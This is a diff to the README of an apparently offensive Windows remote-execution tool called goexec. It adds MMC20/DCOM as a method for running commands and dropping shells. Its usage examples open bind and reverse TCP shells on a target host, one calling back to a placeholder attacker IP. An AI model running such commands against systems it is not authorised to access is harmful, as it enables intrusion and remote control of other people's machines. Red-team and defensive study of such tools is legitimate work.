@@ -12,7 +12,10 @@ Examples and Usage are provided below.
 
 ### Features
 
-* Ad-hoc command execution via WMI, Scheduled Tasks or Windows Services
+* Ad-hoc command execution via multiple mechanisms
+  * WMI - runs as current user (WIP for SYSTEM elevation)
+  * Task/Service - runs as SYSTEM or supplied user if using -runas
+  * MMC20 (DCOM) - runs as current/supplied user
   * All of these rely on SMB to read the resulting command output - task/service names can be customized as needed - if none is specified, a random one is created and deleted following execution.
 * Interactive Shells via Named Pipe or Bind/Reverse TCP
   * Either method can be used to achieve a fully interactive shell into either cmd.exe or powershell.exe
@@ -34,7 +37,7 @@ More to come...
   -domain string
         Domain for remote authentication - should be FQDN such as domain.com or similar - if blank and user is specified will assume local user
   -dropmethod string
-        Method to use for creating named pipe (wmi, task, service) (default "wmi")
+        Method to use for creating named pipe (wmi, task, service, mmc20) (default "wmi")
   -evasion string (Not yet implemented)
         conhost, diskshadow, ftp
   -ip string
@@ -63,8 +66,11 @@ More to come...
 
 ### Usage Examples
 ```
-# Enter interactive bind shell via TCP launched via WMI on default ports
+# Enter interactive bind shell via TCP launched via WMI
 goexec.exe -target 192.168.19.154 -method tcp -port 9999
+
+# Enter interactive bind shell via TCP launched via MMC20 (could also use task/service/wmi)
+goexec.exe -target 192.168.19.154 -method tcp -dropmethod mmc20 -port 9999
 
 # Enter an interactive reverse shell via named TCP launched via WMI (this may be blocked by default depending)
 goexec.exe -target 192.168.19.154 -method tcp -port 9999 -reverse -ip YOUR.LOCAL.IP
